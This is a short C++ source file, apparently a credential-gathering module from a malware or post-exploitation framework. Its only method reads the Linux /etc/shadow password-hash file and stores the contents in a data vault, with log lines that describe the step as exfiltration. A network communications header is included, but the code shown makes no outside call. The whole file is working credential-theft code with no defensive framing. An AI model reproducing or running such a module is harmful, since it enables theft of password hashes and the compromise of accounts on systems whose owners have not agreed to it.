#include "modules/gathering/EtcShadow.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Logger.hpp"
#include "utils/DataVault.hpp"
#include "network/Comms.hpp"

bool EtcShadowMethod::trigger() {
    std::string data;
    
    LOG_INFO("Attempting /etc/shadow exfiltration")
    data += FileUtils::ReadFile("/etc/shadow");

    if (data.empty()) return false;

    LOG_INFO("Adding /etc/shadow to vault")
    DataVault::Append("etc_shadow", data);

    return true;
}
